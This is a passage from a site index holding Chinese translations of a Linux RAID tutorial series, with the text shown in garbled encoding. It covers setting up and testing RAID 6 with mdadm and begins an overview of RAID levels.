ç£ç›˜å‰ï¼Œå…ˆæ£€æŸ¥ä¸‹æˆ‘ä»¬çš„ç£ç›˜æ˜¯å¦åˆ›å»ºè¿‡ RAID åˆ†åŒº: mdadm -E /dev/sd[b-e]### mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### æˆ– åœ¨ç£ç›˜ä¸Šæ£€æŸ¥ RAID åˆ†åŒº æ³¨è§£ åœ¨ä¸Šé¢çš„å›¾ç‰‡ä¸­ï¼Œæ²¡æœ‰æ£€æµ‹åˆ°ä»»ä½• super-block æˆ–è€…è¯´åœ¨å››ä¸ªç£ç›˜ä¸Šæ²¡æœ‰ RAID å­˜åœ¨ã€‚ç°åœ¨æˆ‘ä»¬å¼€å§‹åˆ›å»º RAID 6ã€‚ ç¬¬2æ­¥ï¼šä¸º RAID 6 åˆ›å»ºç£ç›˜åˆ†åŒº ç°åœ¨åœ¨ /dev/sdb , /dev/sdc , /dev/sdd å’Œ /dev/sde ä¸Šä¸º RAID åˆ›å»ºåˆ†åŒºï¼Œ ä½¿ç”¨ä¸‹é¢çš„ fdisk å‘½ä»¤ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•åœ¨ sdb ç£ç›˜åˆ›å»ºåˆ†åŒºï¼ŒåŒæ ·çš„æ­¥éª¤ä¹Ÿé€‚ç”¨äºå…¶ä»–åˆ†åŒºã€‚ åˆ›å»º /dev/sdb åˆ†åŒº: fdisk /dev/sdb è¯·æŒ‰ç…§è¯´æ˜è¿›è¡Œæ“ä½œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºåˆ›å»ºåˆ†åŒºã€‚ æŒ‰ n åˆ›å»ºæ–°çš„åˆ†åŒºã€‚ ç„¶åæŒ‰ P é€‰æ‹©ä¸»åˆ†åŒºã€‚ æ¥ä¸‹æ¥é€‰æ‹©åˆ†åŒºå·ä¸º1ã€‚ åªéœ€æŒ‰ä¸¤æ¬¡å›è½¦é”®é€‰æ‹©é»˜è®¤å€¼å³å¯ã€‚ ç„¶åï¼ŒæŒ‰ P æ¥æ‰“å°åˆ›å»ºå¥½çš„åˆ†åŒºã€‚ æŒ‰ L ï¼Œåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ç±»å‹ã€‚ æŒ‰ t å»ä¿®æ”¹åˆ†åŒºã€‚ é”®å…¥ fd è®¾ç½®ä¸º Linux çš„ RAID ç±»å‹ï¼Œç„¶åæŒ‰å›è½¦ç¡®è®¤ã€‚ ç„¶åå†æ¬¡ä½¿ç”¨ p æŸ¥çœ‹æˆ‘ä»¬æ‰€åšçš„æ›´æ”¹ã€‚ ä½¿ç”¨ w ä¿å­˜æ›´æ”¹ã€‚ åˆ›å»º /dev/sdb åˆ†åŒº* åˆ›å»º /dev/sdc åˆ†åŒº: fdisk /dev/sdc åˆ›å»º /dev/sdc åˆ†åŒº åˆ›å»º /dev/sdd åˆ†åŒº: fdisk /dev/sdd åˆ›å»º /dev/sdd åˆ†åŒº åˆ›å»º /dev/sde åˆ†åŒº: fdisk /dev/sde åˆ›å»º /dev/sde åˆ†åŒº åˆ›å»ºå¥½åˆ†åŒºåï¼Œæ£€æŸ¥ç£ç›˜çš„ super-blocks æ˜¯ä¸ªå¥½çš„ä¹ æƒ¯ã€‚ å¦‚æœ super-blocks ä¸å­˜åœ¨æˆ‘ä»¬å¯ä»¥æŒ‰å‰é¢çš„åˆ›å»ºä¸€ä¸ªæ–°çš„ RAID: mdadm -E /dev/sd[b-e]1 ### mdadm --examine /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1 ### æˆ– Check Raid on New Partitions, åœ¨æ–°åˆ†åŒºä¸­æ£€æŸ¥ RAID ç¬¬3æ­¥ï¼šåˆ›å»º md è®¾å¤‡ï¼ˆRAIDï¼‰ ç°åœ¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»º RAID è®¾å¤‡ md0 ï¼ˆå³ /dev/md0ï¼‰ï¼Œ å¹¶åœ¨æ‰€æœ‰æ–°åˆ›å»ºçš„åˆ†åŒºä¸­åº”ç”¨ RAID çº§åˆ«ï¼Œç„¶åç¡®è®¤ RAID è®¾ç½®: mdadm --create /dev/md0 --level=6 --raid-devices=4 /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1 cat /proc/mdstat åˆ›å»º Raid 6 è®¾å¤‡ ä½ è¿˜å¯ä»¥ä½¿ç”¨ watch å‘½ä»¤æ¥æŸ¥çœ‹å½“å‰åˆ›å»º RAID çš„è¿›ç¨‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º: watch -n1 cat /proc/mdstat æ£€æŸ¥ RAID 6 åˆ›å»ºè¿‡ç¨‹ ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤éªŒè¯ RAID è®¾å¤‡: mdadm -E /dev/sd[b-e]1 æ³¨è§£ ä¸Šè¿°å‘½ä»¤å°†æ˜¾ç¤ºå››ä¸ªç£ç›˜çš„ä¿¡æ¯ï¼Œè¿™æ˜¯ç›¸å½“é•¿çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æˆªå–å…¶å®Œæ•´çš„è¾“å‡ºã€‚ æ¥ä¸‹æ¥ï¼ŒéªŒè¯ RAID é˜µåˆ—ï¼Œä»¥ç¡®è®¤é‡æ–°åŒæ­¥è¿‡ç¨‹å·²ç»å¼€å§‹: mdadm --detail /dev/md0 æ£€æŸ¥ Raid 6 é˜µåˆ— ç¬¬4æ­¥ï¼šåœ¨ RAID è®¾å¤‡ä¸Šåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ ä½¿ç”¨ ext4 ä¸º /dev/md0 åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶å°†å®ƒæŒ‚è½½åœ¨ /mnt/raid6 ã€‚ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ ext4ï¼Œä½†ä½ å¯ä»¥æ ¹æ®ä½ çš„é€‰æ‹©ä½¿ç”¨ä»»æ„ç±»å‹çš„æ–‡ä»¶ç³»ç»Ÿ: mkfs.ext4 /dev/md0 åœ¨ RAID 6 ä¸Šåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ å°†åˆ›å»ºçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° /mnt/raid6ï¼Œå¹¶éªŒè¯æŒ‚è½½ç‚¹ä¸‹çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° lost+found ç›®å½•: mkdir /mnt/raid6### mount /dev/md0 /mnt/raid6/### ls -l /mnt/raid6/ åœ¨æŒ‚è½½ç‚¹ä¸‹åˆ›å»ºä¸€äº›æ–‡ä»¶ï¼Œåœ¨ä»»æ„æ–‡ä»¶ä¸­æ·»åŠ ä¸€äº›æ–‡å­—å¹¶éªŒè¯å…¶å†…å®¹: touch /mnt/raid6/raid6_test.txt ls -l /mnt/raid6/ echo \"tecmint raid setups\" > /mnt/raid6/raid6_test.txt cat /mnt/raid6/raid6_test.txt éªŒè¯ RAID å†…å®¹ åœ¨ /etc/fstab ä¸­æ·»åŠ ä»¥ä¸‹æ¡ç›®ä½¿ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨æŒ‚è½½è®¾å¤‡ï¼Œæ“ä½œç³»ç»Ÿç¯å¢ƒä¸åŒæŒ‚è½½ç‚¹å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒ: vim /etc/fstab/dev/md0 /mnt/raid6 ext4 defaults 0 0 è‡ªåŠ¨æŒ‚è½½ RAID 6 è®¾å¤‡ æ¥ä¸‹æ¥ï¼Œæ‰§è¡Œ mount -a å‘½ä»¤æ¥éªŒè¯ fstab ä¸­çš„æ¡ç›®æ˜¯å¦æœ‰é”™è¯¯: mount -av éªŒè¯ RAID æ˜¯å¦è‡ªåŠ¨æŒ‚è½½ ç¬¬5æ­¥ï¼šä¿å­˜ RAID 6 çš„é…ç½® è¯·æ³¨æ„ï¼Œé»˜è®¤æƒ…å†µä¸‹ RAID æ²¡æœ‰é…ç½®æ–‡ä»¶ã€‚ æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰‹åŠ¨ä¿å­˜å®ƒï¼Œç„¶åæ£€æŸ¥è®¾å¤‡ /dev/md0 çš„çŠ¶æ€: mdadm --detail --scan --verbose >> /etc/mdadm.conf cat /etc/mdadm.conf mdadm --detail /dev/md0 ä¿å­˜ RAID 6 é…ç½® æ£€æŸ¥ RAID 6 çŠ¶æ€ ç¬¬6æ­¥ï¼šæ·»åŠ å¤‡ç”¨ç£ç›˜ ç°åœ¨ï¼Œå·²ç»ä½¿ç”¨äº†4ä¸ªç£ç›˜ï¼Œå¹¶ä¸”å…¶ä¸­ä¸¤ä¸ªä½œä¸ºå¥‡å¶æ ¡éªŒä¿¡æ¯æ¥ä½¿ç”¨ã€‚ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚æœä»»æ„ä¸€ä¸ªç£ç›˜å‡ºç°æ•…éšœï¼Œæˆ‘ä»¬ä»å¯ä»¥å¾—åˆ°æ•°æ®ï¼Œå› ä¸ºåœ¨ RAID 6 ä½¿ç”¨åŒå¥‡å¶æ ¡éªŒã€‚ å¦‚æœç¬¬äºŒä¸ªç£ç›˜ä¹Ÿå‡ºç°æ•…éšœï¼Œåœ¨ç¬¬ä¸‰å—ç£ç›˜æŸåå‰æˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„ã€‚ å¯ä»¥åœ¨åˆ›å»º RAID é›†æ—¶åŠ å…¥ä¸€ä¸ªå¤‡ç”¨ç£ç›˜ï¼Œä½†æˆ‘åœ¨åˆ›å»º RAID é›†åˆå‰æ²¡æœ‰å®šä¹‰å¤‡ç”¨çš„ç£ç›˜ã€‚ ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç£ç›˜æŸååæˆ–è€…åˆ›å»º RAID é›†åˆæ—¶æ·»åŠ ä¸€å—å¤‡ç”¨ç£ç›˜ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»åˆ›å»ºå¥½äº† RAIDï¼Œä¸‹é¢è®©æˆ‘æ¼”ç¤ºå¦‚ä½•æ·»åŠ å¤‡ç”¨ç£ç›˜ã€‚ ä¸ºäº†è¾¾åˆ°æ¼”ç¤ºçš„ç›®çš„ï¼Œæˆ‘å·²ç»çƒ­æ’å…¥äº†ä¸€ä¸ªæ–°çš„ HDD ç£ç›˜ï¼ˆå³ /dev/sdfï¼‰ï¼Œè®©æˆ‘ä»¬æ¥éªŒè¯æ¥å…¥çš„ç£ç›˜: ls -l /dev/ | grep sd æ£€æŸ¥æ–°ç£ç›˜ ç°åœ¨å†æ¬¡ç¡®è®¤æ–°è¿æ¥çš„ç£ç›˜æ²¡æœ‰é…ç½®è¿‡ RAID ï¼Œä½¿ç”¨ mdadm æ¥æ£€æŸ¥: mdadm --examine /dev/sdf åœ¨æ–°ç£ç›˜ä¸­æ£€æŸ¥ RAID åƒå¾€å¸¸ä¸€æ ·ï¼Œæˆ‘ä»¬æ—©å‰å·²ç»ä¸ºå››ä¸ªç£ç›˜åˆ›å»ºäº†åˆ†åŒºï¼ŒåŒæ ·ï¼Œæˆ‘ä»¬ä½¿ç”¨ fdisk å‘½ä»¤ä¸ºæ–°æ’å…¥çš„ç£ç›˜åˆ›å»ºæ–°åˆ†åŒº: fdisk /dev/sdf ä¸º /dev/sdf åˆ›å»ºåˆ†åŒº åœ¨ /dev/sdf åˆ›å»ºæ–°çš„åˆ†åŒºåï¼Œåœ¨æ–°åˆ†åŒºä¸Šç¡®è®¤æ²¡æœ‰ RAIDï¼Œ ç„¶åå°†å¤‡ç”¨ç£ç›˜æ·»åŠ åˆ° RAID è®¾å¤‡ /dev/md0 ä¸­ï¼Œå¹¶éªŒè¯æ·»åŠ çš„è®¾å¤‡: mdadm --examine /dev/sdf mdadm --examine /dev/sdf1 mdadm --add /dev/md0 /dev/sdf1 mdadm --detail /dev/md0 åœ¨ sdf åˆ†åŒºä¸ŠéªŒè¯ Raid Add sdf Partition to Raid, æ·»åŠ  sdf åˆ†åŒºåˆ° RAID éªŒè¯ sdf åˆ†åŒºä¿¡æ¯ ç¬¬7æ­¥ï¼šæ£€æŸ¥ RAID 6 å®¹é”™ ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ£€æŸ¥å¤‡ç”¨é©±åŠ¨å™¨æ˜¯å¦èƒ½è‡ªåŠ¨å·¥ä½œï¼Œå½“æˆ‘ä»¬é˜µåˆ—ä¸­çš„ä»»ä½•ä¸€ä¸ªç£ç›˜å‡ºç°æ•…éšœæ—¶ã€‚ ä¸ºäº†æµ‹è¯•ï¼Œæˆ‘å°†ä¸€ä¸ªç£ç›˜æ‰‹å·¥æ ‡è®°ä¸ºæ•…éšœè®¾å¤‡ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ ‡è®° /dev/sdd1 ä¸ºæ•…éšœç£ç›˜: mdadm --manage --fail /dev/md0 /dev/sdd1 æ£€æŸ¥ RAID 6 å®¹é”™ è®©æˆ‘ä»¬æŸ¥çœ‹ RAID çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¹¶æ£€æŸ¥å¤‡ç”¨ç£ç›˜æ˜¯å¦å¼€å§‹åŒæ­¥: mdadm --detail /dev/md0 æ£€æŸ¥ RAID è‡ªåŠ¨åŒæ­¥ è¿™é‡Œï¼Œæˆ‘ä»¬çœ‹åˆ°å¤‡ç”¨ç£ç›˜æ¿€æ´»äº†ï¼Œå¹¶å¼€å§‹é‡å»ºè¿›ç¨‹ã€‚ åœ¨åº•éƒ¨ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰æ•…éšœçš„ç£ç›˜ /dev/sdd1 æ ‡è®°ä¸º faultyã€‚å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹è¿›ç¨‹é‡å»º: cat /proc/mdstat RAID 6 è‡ªåŠ¨åŒæ­¥","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Install-RAID-6-(strip--based-dual-distributed-puppet-verification).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Install-RAID-6-(strip--based-dual-distributed-puppet-verification).html"},{"title":"RAID çš„çº§åˆ«å’Œæ¦‚å¿µ","text":"å‚è€ƒ:: ä½œè€…: Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling è¯„è®º: https://linux.cn/portal.php?mod=comment&id=6085&idtype=aid RAID çš„æ„æ€æ˜¯å»‰ä»·ç£ç›˜å†—ä½™é˜µåˆ—ï¼ˆRedundant Array of Inexpensive Disksï¼‰ï¼Œ ä½†ç°åœ¨å®ƒè¢«ç§°ä¸ºç‹¬ç«‹ç£ç›˜å†—ä½™é˜µåˆ—ï¼ˆRedundant Array of Independent Drivesï¼‰ã€‚ æ—©å…ˆä¸€ä¸ªå®¹é‡å¾ˆå°çš„ç£ç›˜éƒ½æ˜¯éå¸¸æ˜‚è´µçš„ï¼Œä½†æ˜¯ç°åœ¨æˆ‘ä»¬å¯ä»¥å¾ˆä¾¿å®œçš„ä¹°åˆ°ä¸€ä¸ªæ›´å¤§çš„ç£ç›˜ã€‚ Raid æ˜¯ä¸€ç³»åˆ—æ”¾åœ¨ä¸€èµ·ï¼Œæˆä¸ºä¸€ä¸ªé€»è¾‘å·çš„ç£ç›˜é›†åˆã€‚ åœ¨ Linux ä¸­ç†è§£ RAID è®¾ç½® RAID åŒ…å«ä¸€ç»„æˆ–è€…ä¸€ä¸ªé›†åˆç”šè‡³ä¸€ä¸ªé˜µåˆ—ã€‚ ä½¿ç”¨ä¸€ç»„ç£ç›˜ç»“åˆé©±åŠ¨å™¨ç»„æˆ RAID é˜µåˆ—æˆ– RAID é›†ã€‚ å°†è‡³å°‘ä¸¤ä¸ªç£ç›˜è¿æ¥åˆ°ä¸€ä¸ª RAID æ§åˆ¶å™¨ï¼Œè€Œæˆä¸ºä¸€ä¸ªé€»è¾‘å·ï¼Œä¹Ÿå¯ä»¥å°†å¤šä¸ªé©±åŠ¨å™¨æ”¾åœ¨ä¸€ä¸ªç»„ä¸­ã€‚ ä¸€ç»„ç£ç›˜åªèƒ½ä½¿ç”¨ä¸€ä¸ª RAID çº§åˆ«ã€‚ ä½¿ç”¨ RAID å¯ä»¥æé«˜æœåŠ¡å™¨çš„æ€§èƒ½ã€‚ ä¸åŒ RAID çš„çº§åˆ«ï¼Œæ€§èƒ½ä¼šæœ‰æ‰€ä¸åŒã€‚å®ƒé€šè¿‡å®¹é”™å’Œé«˜å¯ç”¨æ€§æ¥ä¿å­˜æˆ‘ä»¬çš„æ•°æ®ã€‚ è¿™ä¸ªç³»åˆ—è¢«å‘½åä¸º\"åœ¨ Linux ä¸‹ä½¿ç”¨ RAID\"ï¼Œåˆ†ä¸º9ä¸ªéƒ¨åˆ†ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¸»é¢˜ï¼š ç¬¬1éƒ¨åˆ†: ä»‹ç» RAID çš„çº§åˆ«å’Œæ¦‚å¿µ ç¬¬2éƒ¨åˆ†: åœ¨Linuxä¸­å¦‚ä½•è®¾ç½® RAID0ï¼ˆæ¡å¸¦åŒ–ï¼‰ ç¬¬3éƒ¨åˆ†: åœ¨Linuxä¸­å¦‚ä½•è®¾ç½® RAID1ï¼ˆé•œåƒåŒ–ï¼‰ ç¬¬4éƒ¨åˆ†: åœ¨Linuxä¸­å¦‚ä½•è®¾ç½® RAID5ï¼ˆæ¡å¸¦åŒ–ä¸åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒï¼‰ ç¬¬5éƒ¨åˆ†: åœ¨Linuxä¸­å¦‚ä½•è®¾ç½® RAID6ï¼ˆæ¡å¸¦åŒåˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒï¼‰ ç¬¬6éƒ¨åˆ†: åœ¨Linuxä¸­è®¾ç½® RAID 10 æˆ–1 + 0ï¼ˆåµŒå¥—ï¼‰ ç¬¬7éƒ¨åˆ†: æ‰©å±•ç°æœ‰çš„ RAID é˜µåˆ—å’Œåˆ é™¤æ•…éšœçš„ç£ç›˜ ç¬¬8éƒ¨åˆ†: åœ¨ RAID ä¸­æ¢å¤ï¼ˆé‡å»ºï¼‰æŸåçš„é©±åŠ¨å™¨ ç¬¬9éƒ¨åˆ†: åœ¨ Linux ä¸­ç®¡ç† RAID è¿™æ˜¯9ç¯‡ç³»åˆ—æ•™ç¨‹çš„ç¬¬1éƒ¨åˆ†ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°†ä»‹ç» RAID çš„æ¦‚å¿µå’Œ RAID çº§åˆ«ï¼Œè¿™æ˜¯åœ¨ Linux ä¸­æ„å»º RAID éœ€è¦ç†è§£çš„ã€‚ è½¯ä»¶ RAID å’Œç¡¬ä»¶ RAID è½¯ä»¶ RAID çš„æ€§èƒ½è¾ƒä½ å› ä¸ºå…¶ä½¿ç”¨ä¸»æœºçš„èµ„æºã€‚ éœ€è¦åŠ è½½ RAID è½¯ä»¶ä»¥ä»è½¯ä»¶ RAID å·ä¸­è¯»å–æ•°æ®ã€‚ åœ¨åŠ è½½ RAID è½¯ä»¶å‰ï¼Œæ“ä½œç³»ç»Ÿéœ€è¦å¼•å¯¼èµ·æ¥æ‰èƒ½åŠ è½½ RAID è½¯ä»¶ã€‚ åœ¨è½¯ä»¶ RAID ä¸­æ— éœ€ç‰©ç†ç¡¬ä»¶ã€‚é›¶æˆæœ¬æŠ•èµ„ã€‚ ç¡¬ä»¶ RAID çš„æ€§èƒ½è¾ƒé«˜ ä»–ä»¬é‡‡ç”¨ PCI Express å¡ç‰©ç†åœ°æä¾›æœ‰ä¸“ç”¨çš„ RAID æ§åˆ¶å™¨ã€‚ å®ƒä¸ä¼šä½¿ç”¨ä¸»æœºèµ„æºã€‚ ä»–ä»¬æœ‰ NVRAM ç”¨äºç¼“å­˜çš„è¯»å–å’Œå†™å…¥ã€‚ ç¼“å­˜ç”¨äº RAID é‡å»ºæ—¶ï¼Œå³ä½¿å‡ºç°ç”µæºæ•…éšœï¼Œå®ƒä¼šä½¿ç”¨åå¤‡çš„ç”µæ± ç”µæºä¿æŒç¼“å­˜ã€‚ å¯¹äºå¤§è§„æ¨¡ä½¿ç”¨æ˜¯éå¸¸æ˜‚è´µçš„æŠ•èµ„ã€‚ é‡è¦çš„ RAID æ¦‚å¿µ æ ¡éªŒ æ–¹å¼ç”¨åœ¨ RAID é‡å»ºä¸­ä»æ ¡éªŒæ‰€ä¿å­˜çš„ä¿¡æ¯ä¸­é‡æ–°ç”Ÿæˆä¸¢å¤±çš„å†…å®¹ã€‚ RAID 5ï¼ŒRAID 6 åŸºäºæ ¡éªŒã€‚ æ¡å¸¦åŒ– æ˜¯å°†åˆ‡ç‰‡æ•°æ®éšæœºå­˜å‚¨åˆ°å¤šä¸ªç£ç›˜ã€‚å®ƒä¸ä¼šåœ¨å•ä¸ªç£ç›˜ä¸­ä¿å­˜å®Œæ•´çš„æ•°æ®ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨2ä¸ªç£ç›˜ï¼Œåˆ™æ¯ä¸ªç£ç›˜å­˜å‚¨æˆ‘ä»¬çš„ä¸€åŠæ•°æ®ã€‚ é•œåƒ è¢«ç”¨äº RAID 1 å’Œ RAID 10ã€‚é•œåƒä¼šè‡ªåŠ¨å¤‡ä»½æ•°æ®ã€‚åœ¨ RAID 1 ä¸­ï¼Œå®ƒä¼šä¿å­˜ç›¸åŒçš„å†…å®¹åˆ°å…¶ä»–ç›˜ä¸Šã€‚ çƒ­å¤‡ä»½ åªæ˜¯æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªå¤‡ç”¨é©±åŠ¨å™¨ï¼Œå®ƒå¯ä»¥è‡ªåŠ¨æ›´æ¢å‘ç”Ÿæ•…éšœçš„é©±åŠ¨å™¨ã€‚åœ¨æˆ‘ä»¬çš„é˜µåˆ—ä¸­ï¼Œå¦‚æœä»»ä½•ä¸€ä¸ªé©±åŠ¨å™¨æŸåï¼Œçƒ­å¤‡ä»½é©±åŠ¨å™¨ä¼šè‡ªåŠ¨ç”¨äºé‡å»º RAIDã€‚ å— æ˜¯ RAID æ§åˆ¶å™¨æ¯æ¬¡è¯»å†™æ•°æ®æ—¶çš„æœ€å°å•ä½ï¼Œæœ€å° 4KBã€‚é€šè¿‡å®šä¹‰å—å¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥å¢åŠ  I/O æ€§èƒ½ã€‚ RAIDæœ‰ä¸åŒçš„çº§åˆ«ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä»…åˆ—å‡ºåœ¨çœŸå®ç¯å¢ƒä¸‹çš„ä½¿ç”¨æœ€å¤šçš„ RAID çº§åˆ«ã€‚ RAID0 = æ¡å¸¦åŒ– RAID1 = é•œåƒ RAID5 = å•ç£ç›˜åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒ RAID6 = åŒç£ç›˜åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒ RAID10 = é•œåƒ + æ¡å¸¦ã€‚ï¼ˆåµŒå¥—RAIDï¼‰ RAID åœ¨å¤§å¤šæ•° Linux å‘è¡Œç‰ˆä¸Šä½¿ç”¨åä¸º mdadm çš„è½¯ä»¶åŒ…è¿›è¡Œç®¡ç†ã€‚è®©æˆ‘ä»¬å…ˆå¯¹æ¯ä¸ª RAID çº§åˆ«è®¤è¯†ä¸€ä¸‹ã€‚ RAID 0 / æ¡å¸¦åŒ– æ¡å¸¦åŒ–æœ‰å¾ˆå¥½çš„æ€§èƒ½ã€‚ åœ¨ RAID 0ï¼ˆæ¡å¸¦åŒ–ï¼‰ä¸­æ•°æ®å°†ä½¿ç”¨åˆ‡ç‰‡çš„æ–¹å¼è¢«å†™å…¥åˆ°ç£ç›˜ã€‚ ä¸€åŠçš„å†…å®¹æ”¾åœ¨ä¸€ä¸ªç£ç›˜ä¸Šï¼Œå¦ä¸€åŠå†…å®¹å°†è¢«å†™å…¥åˆ°å¦ä¸€ä¸ªç£ç›˜ã€‚ å‡è®¾æˆ‘ä»¬æœ‰2ä¸ªç£ç›˜é©±åŠ¨å™¨ï¼Œ ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬å°†æ•°æ®\"TECMINT\"å†™åˆ°é€»è¾‘å·ä¸­ï¼Œ \"T\"å°†è¢«ä¿å­˜åœ¨ç¬¬ä¸€ç›˜ä¸­ï¼Œ\"E\"å°†ä¿å­˜åœ¨ç¬¬äºŒç›˜ï¼Œ 'C'å°†è¢«ä¿å­˜åœ¨ç¬¬ä¸€ç›˜ï¼Œ\"M\"å°†ä¿å­˜åœ¨ç¬¬äºŒç›˜ï¼Œå®ƒä¼šä¸€ç›´ç»§ç»­æ­¤å¾ªç¯è¿‡ç¨‹ã€‚ ï¼ˆLCTT è¯‘æ³¨ï¼šå®é™…ä¸Šä¸å¯èƒ½æŒ‰å­—èŠ‚åˆ‡ç‰‡ï¼Œæ˜¯æŒ‰æ•°æ®å—åˆ‡ç‰‡çš„ã€‚ï¼‰ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœé©±åŠ¨å™¨ä¸­çš„ä»»ä½•ä¸€ä¸ªå‘ç”Ÿæ•…éšœï¼Œæˆ‘ä»¬å°±ä¼šä¸¢å¤±æ•°æ®ï¼Œ å› ä¸ºä¸€ä¸ªç›˜ä¸­åªæœ‰ä¸€åŠçš„æ•°æ®ï¼Œä¸èƒ½ç”¨äºé‡å»º RAIDã€‚ ä¸è¿‡ï¼Œå½“æ¯”è¾ƒå†™å…¥é€Ÿåº¦å’Œæ€§èƒ½æ—¶ï¼ŒRAID 0 æ˜¯éå¸¸å¥½çš„ã€‚ åˆ›å»º RAID 0ï¼ˆæ¡å¸¦åŒ–ï¼‰è‡³å°‘éœ€è¦2ä¸ªç£ç›˜ã€‚å¦‚æœä½ çš„æ•°æ®æ˜¯éå¸¸å®è´µçš„ï¼Œé‚£ä¹ˆä¸è¦ä½¿ç”¨æ­¤ RAID çº§åˆ«ã€‚ é«˜æ€§èƒ½ã€‚ RAID 0 ä¸­å®¹é‡é›¶æŸå¤±ã€‚ é›¶å®¹é”™ã€‚ å†™å’Œè¯»æœ‰å¾ˆé«˜çš„æ€§èƒ½ã€‚ RAID 1 / é•œåƒåŒ– é•œåƒä¹Ÿæœ‰ä¸é”™çš„æ€§èƒ½ã€‚ é•œåƒå¯ä»¥å¯¹æˆ‘ä»¬çš„æ•°æ®åšä¸€ä»½ç›¸åŒçš„å‰¯æœ¬ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ª2TBçš„ç¡¬ç›˜é©±åŠ¨å™¨ï¼Œæˆ‘ä»¬æ€»å…±æœ‰4TBï¼Œ ä½†åœ¨é•œåƒä¸­ï¼Œä½†æ˜¯æ”¾åœ¨ RAID æ§åˆ¶å™¨åé¢çš„é©±åŠ¨å™¨å½¢æˆäº†ä¸€ä¸ªé€»è¾‘é©±åŠ¨å™¨ï¼Œæˆ‘ä»¬åªèƒ½çœ‹åˆ°è¿™ä¸ªé€»è¾‘é©±åŠ¨å™¨æœ‰2TBã€‚ å½“æˆ‘ä»¬ä¿å­˜æ•°æ®æ—¶ï¼Œå®ƒå°†åŒæ—¶å†™å…¥è¿™ä¸¤ä¸ª2TBé©±åŠ¨å™¨ä¸­ã€‚ åˆ›å»º RAID 1ï¼ˆé•œåƒåŒ–ï¼‰æœ€å°‘éœ€è¦ä¸¤ä¸ªé©±åŠ¨å™¨ã€‚ å¦‚æœå‘ç”Ÿç£ç›˜æ•…éšœï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ¢ä¸€ä¸ªæ–°çš„ç£ç›˜æ¢å¤ RAID ã€‚ å¦‚æœåœ¨ RAID 1 ä¸­ä»»ä½•ä¸€ä¸ªç£ç›˜å‘ç”Ÿæ•…éšœï¼Œ æˆ‘ä»¬å¯ä»¥ä»å¦ä¸€ä¸ªç£ç›˜ä¸­è·å–ç›¸åŒçš„æ•°æ®ï¼Œå› ä¸ºå¦å¤–çš„ç£ç›˜ä¸­ä¹Ÿæœ‰ç›¸åŒçš„æ•°æ®ã€‚æ‰€ä»¥æ˜¯é›¶æ•°æ®ä¸¢å¤±ã€‚ è‰¯å¥½çš„æ€§èƒ½ã€‚ æ€»å®¹é‡ä¸¢å¤±ä¸€åŠå¯ç”¨ç©ºé—´ã€‚ å®Œå…¨å®¹é”™ã€‚ é‡å»ºä¼šæ›´å¿«ã€‚ å†™æ€§èƒ½å˜æ…¢ã€‚ è¯»æ€§èƒ½å˜å¥½ã€‚ èƒ½ç”¨äºæ“ä½œç³»ç»Ÿå’Œå°è§„æ¨¡çš„æ•°æ®åº“ã€‚ RAID 5 / åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒ RAID 5 å¤šç”¨äºä¼ä¸šçº§ã€‚ RAID 5 çš„ä»¥åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒçš„æ–¹å¼å·¥ä½œã€‚ å¥‡å¶æ ¡éªŒä¿¡æ¯å°†è¢«ç”¨äºé‡å»ºæ•°æ®ã€‚ 